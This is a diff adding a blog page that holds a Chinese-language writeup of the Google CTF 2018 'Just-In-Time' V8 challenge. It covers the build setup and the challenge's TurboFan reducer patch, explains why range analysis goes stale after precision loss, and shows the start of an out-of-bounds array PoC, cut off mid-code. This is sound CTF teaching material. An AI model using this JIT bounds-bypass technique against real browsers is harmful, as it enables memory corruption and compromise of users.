@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="看了這篇文章後想自己嘗試看看，弄了好幾天總算搞出來了 owobhttps:&#x2F;&#x2F;doar-e.github.io&#x2F;blog&#x2F;2019&#x2F;01&#x2F;28&#x2F;introduction-to-turbofan&#x2F;#setup 環境搭建使用 Ubuntu 20.04patch 連結: https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;google-ctf&#x2F;blob&#x2F;master&#x2F;2018&#x2F;finals&#x2F;pwn-ju">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Google CTF 2018 Just-In-Time">
+<meta property="og:url" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/index.html">
+<meta property="og:site_name" content="Terry1234&#39;s blog">
+<meta property="og:description" content="看了這篇文章後想自己嘗試看看，弄了好幾天總算搞出來了 owobhttps:&#x2F;&#x2F;doar-e.github.io&#x2F;blog&#x2F;2019&#x2F;01&#x2F;28&#x2F;introduction-to-turbofan&#x2F;#setup 環境搭建使用 Ubuntu 20.04patch 連結: https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;google-ctf&#x2F;blob&#x2F;master&#x2F;2018&#x2F;finals&#x2F;pwn-ju">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/before.png">
+<meta property="og:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/after.png">
+<meta property="og:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/poc.png">
+<meta property="og:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/typer.png">
+<meta property="og:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/lowering.png">
+<meta property="og:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/oob.png">
+<meta property="og:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/result.png">
+<meta property="article:published_time" content="2023-10-27T11:25:44.000Z">
+<meta property="article:modified_time" content="2025-09-08T11:33:01.580Z">
+<meta property="article:author" content="Terry1234">
+<meta property="article:tag" content="CTF writeup">
+<meta property="article:tag" content="V8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/before.png">
+
+<link rel="canonical" href="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Google CTF 2018 Just-In-Time | Terry1234's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Terry1234's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我們終會抵達各自的終點</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Terry1234">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Terry1234's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Google CTF 2018 Just-In-Time
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-10-27 19:25:44" itemprop="dateCreated datePublished" datetime="2023-10-27T19:25:44+08:00">2023-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-09-08 19:33:01" itemprop="dateModified" datetime="2025-09-08T19:33:01+08:00">2025-09-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>看了這篇文章後想自己嘗試看看，弄了好幾天總算搞出來了 owob<br><a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#setup">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#setup</a></p>
+<h2 id="環境搭建"><a href="#環境搭建" class="headerlink" title="環境搭建"></a>環境搭建</h2><p>使用 Ubuntu 20.04<br>patch 連結: <a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/blob/master/2018/finals/pwn-just-in-time/attachments/addition-reducer.patch">https://github.com/google/google-ctf/blob/master/2018/finals/pwn-just-in-time/attachments/addition-reducer.patch</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard e0a58f83255d1dae907e2ba4564ad8928a7dedf4</span><br><span class="line">git apply addition-reducer.patch</span><br><span class="line">gn gen out/x64.release --args=&#x27;v8_monolithic=true v8_use_external_startup_data=false is_component_build=false is_debug=false target_cpu =&quot;x64&quot; use_goma=false goma_dir=&quot;None&quot; v8_enable_backtrace=true v8_enable_disassembler=true v8_enable_object_print=true v8_enable_verify_heap=true v8_untrusted_code_mitigations = false&#x27;</span><br><span class="line">ninja -C out/x64.release d8</span><br></pre></td></tr></table></figure>
+
+<h2 id="patch-分析"><a href="#patch-分析" class="headerlink" title="patch 分析"></a>patch 分析</h2><p>題目給了兩個 patch</p>
+<h3 id="nosandbox-patch"><a href="#nosandbox-patch" class="headerlink" title="nosandbox.patch"></a>nosandbox.patch</h3><p>針對 chromium 的 patch，用來把 chrome 的 sandbox 拔掉，不過我這題的 chrome 一直 build 失敗就沒用這個了，只上 V8 的 patch 也不影響解題</p>
+<h3 id="addition-reducer-patch"><a href="#addition-reducer-patch" class="headerlink" title="addition-reducer.patch"></a>addition-reducer.patch</h3><p>針對 V8 的 patch，新增了一個 reducer<br>當節點是 kNumberAdd、左節點是 kNumberAdd、右節點是 kNumberConstant 時會嘗試合併節點</p>
+<h4 id="合併前的節點"><a href="#合併前的節點" class="headerlink" title="合併前的節點"></a>合併前的節點</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/before.png"></p>
+<h4 id="合併後的節點"><a href="#合併後的節點" class="headerlink" title="合併後的節點"></a>合併後的節點</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/after.png"></p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/BUILD.gn b/BUILD.gn</span></span><br><span class="line"><span class="comment">index c6a58776cd..14c56d2910 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.gn</span></span><br><span class="line"><span class="comment">+++ b/BUILD.gn</span></span><br><span class="line"><span class="meta">@@ -1699,6 +1699,8 @@</span> v8_source_set(&quot;v8_base&quot;) &#123;</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.cc&quot;,</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.h&quot;,</span><br><span class="line">     &quot;src/compiler/diamond.h&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/compiler/duplicate-addition-reducer.cc&quot;,</span></span><br><span class="line"><span class="addition">+    &quot;src/compiler/duplicate-addition-reducer.h&quot;,</span></span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.cc&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.h&quot;,</span><br><span class="line">     &quot;src/compiler/escape-analysis-reducer.cc&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000000..59e8437f3d</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/duplicate-addition-reducer.cc</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,71 @@</span></span><br><span class="line"><span class="addition">+// Copyright 2018 Google LLC</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="addition">+// you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="addition">+// You may obtain a copy of the License at</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+//      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+// Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="addition">+// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="addition">+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="addition">+// See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="addition">+// limitations under the License.</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/common-operator.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/graph.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/node-properties.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+namespace compiler &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,</span></span><br><span class="line"><span class="addition">+                     CommonOperatorBuilder* common)</span></span><br><span class="line"><span class="addition">+    : AdvancedReducer(editor),</span></span><br><span class="line"><span class="addition">+      graph_(graph), common_(common) &#123;&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span></span><br><span class="line"><span class="addition">+  switch (node-&gt;opcode()) &#123;</span></span><br><span class="line"><span class="addition">+    case IrOpcode::kNumberAdd:</span></span><br><span class="line"><span class="addition">+      return ReduceAddition(node);</span></span><br><span class="line"><span class="addition">+    default:</span></span><br><span class="line"><span class="addition">+      return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;</span></span><br><span class="line"><span class="addition">+  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);</span></span><br><span class="line"><span class="addition">+  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);</span></span><br><span class="line"><span class="addition">+  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Node* left = NodeProperties::GetValueInput(node, 0);</span></span><br><span class="line"><span class="addition">+  if (left-&gt;opcode() != node-&gt;opcode()) &#123;</span></span><br><span class="line"><span class="addition">+    return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Node* right = NodeProperties::GetValueInput(node, 1);</span></span><br><span class="line"><span class="addition">+  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span></span><br><span class="line"><span class="addition">+    return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Node* parent_left = NodeProperties::GetValueInput(left, 0);</span></span><br><span class="line"><span class="addition">+  Node* parent_right = NodeProperties::GetValueInput(left, 1);</span></span><br><span class="line"><span class="addition">+  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span></span><br><span class="line"><span class="addition">+    return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  double const1 = OpParameter&lt;double&gt;(right-&gt;op());</span></span><br><span class="line"><span class="addition">+  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());</span></span><br><span class="line"><span class="addition">+  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  NodeProperties::ReplaceValueInput(node, parent_left, 0);</span></span><br><span class="line"><span class="addition">+  NodeProperties::ReplaceValueInput(node, new_const, 1);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return Changed(node);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace compiler</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="comment">diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.h</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000000..7285f1ae3e</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/duplicate-addition-reducer.h</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,60 @@</span></span><br><span class="line"><span class="addition">+/*</span></span><br><span class="line"><span class="addition">+ * Copyright 2018 Google LLC</span></span><br><span class="line"><span class="addition">+ *</span></span><br><span class="line"><span class="addition">+ * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="addition">+ * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="addition">+ * You may obtain a copy of the License at</span></span><br><span class="line"><span class="addition">+ *</span></span><br><span class="line"><span class="addition">+ *      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="addition">+ *</span></span><br><span class="line"><span class="addition">+ * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="addition">+ * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="addition">+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="addition">+ * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="addition">+ * limitations under the License.</span></span><br><span class="line"><span class="addition">+ */</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span></span><br><span class="line"><span class="addition">+#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/base/compiler-specific.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/graph-reducer.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/globals.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/machine-type.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+namespace compiler &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Forward declarations.</span></span><br><span class="line"><span class="addition">+class CommonOperatorBuilder;</span></span><br><span class="line"><span class="addition">+class Graph;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+class V8_EXPORT_PRIVATE DuplicateAdditionReducer final</span></span><br><span class="line"><span class="addition">+    : public NON_EXPORTED_BASE(AdvancedReducer) &#123;</span></span><br><span class="line"><span class="addition">+ public:</span></span><br><span class="line"><span class="addition">+  DuplicateAdditionReducer(Editor* editor, Graph* graph,</span></span><br><span class="line"><span class="addition">+                      CommonOperatorBuilder* common);</span></span><br><span class="line"><span class="addition">+  ~DuplicateAdditionReducer() final &#123;&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  const char* reducer_name() const override &#123; return &quot;DuplicateAdditionReducer&quot;; &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Reduction Reduce(Node* node) final;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+ private:</span></span><br><span class="line"><span class="addition">+  Reduction ReduceAddition(Node* node);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Graph* graph() const &#123; return graph_;&#125;</span></span><br><span class="line"><span class="addition">+  CommonOperatorBuilder* common() const &#123; return common_; &#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Graph* const graph_;</span></span><br><span class="line"><span class="addition">+  CommonOperatorBuilder* const common_;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace compiler</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span></span><br><span class="line"><span class="comment">diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc</span></span><br><span class="line"><span class="comment">index 5717c70348..8cca161ad5 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/pipeline.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/pipeline.cc</span></span><br><span class="line"><span class="meta">@@ -27,6 +27,7 @@</span></span><br><span class="line"> #include &quot;src/compiler/constant-folding-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/control-flow-optimizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/dead-code-elimination.h&quot;</span><br><span class="line"><span class="addition">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span></span><br><span class="line"> #include &quot;src/compiler/effect-control-linearizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis.h&quot;</span><br><span class="line"><span class="meta">@@ -1301,6 +1302,8 @@</span> struct TypedLoweringPhase &#123;</span><br><span class="line">                                data-&gt;jsgraph()-&gt;Dead());</span><br><span class="line">     DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                               data-&gt;common(), temp_zone);</span><br><span class="line"><span class="addition">+    DuplicateAdditionReducer duplicate_addition_reducer(&amp;graph_reducer, data-&gt;graph(),</span></span><br><span class="line"><span class="addition">+                                              data-&gt;common());</span></span><br><span class="line">     JSCreateLowering create_lowering(&amp;graph_reducer, data-&gt;dependencies(),</span><br><span class="line">                                      data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span><br><span class="line">                                      data-&gt;native_context(), temp_zone);</span><br><span class="line"><span class="meta">@@ -1318,6 +1321,7 @@</span> struct TypedLoweringPhase &#123;</span><br><span class="line">                                          data-&gt;js_heap_broker(), data-&gt;common(),</span><br><span class="line">                                          data-&gt;machine(), temp_zone);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line"><span class="addition">+    AddReducer(data, &amp;graph_reducer, &amp;duplicate_addition_reducer);</span></span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;create_lowering);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);</span><br></pre></td></tr></table></figure>
+<p>看似沒問題，但在 V8 中浮點數是用 IEEE 754 表示的，大於 Number.MAX_SAFE_INTEGEER 在計算時可能會出現問題<br>來個例子<br><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/poc.png"><br>由於節點的資料範圍是在 typer phase 計算的，而 duplicate_addition_reducer 是在 typer phase 之後的 typed lowering phase 被執行的，且 duplicate_addition_reducer 不會更新節點的範圍，可以利用這個機制進行 oob 讀寫</p>
+<h4 id="typer-phase"><a href="#typer-phase" class="headerlink" title="typer phase"></a>typer phase</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/typer.png"></p>
+<h4 id="typed-lowering-phase"><a href="#typed-lowering-phase" class="headerlink" title="typed lowering phase"></a>typed lowering phase</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/lowering.png"></p>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">poc</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>];</span><br><span class="line">    <span class="keyword">let</span> x = a == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">    x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    x -= <span class="number">9007199254740991</span>; <span class="comment">//Range(0, 1), but actually Range(0, 3)</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">poc</span>(<span 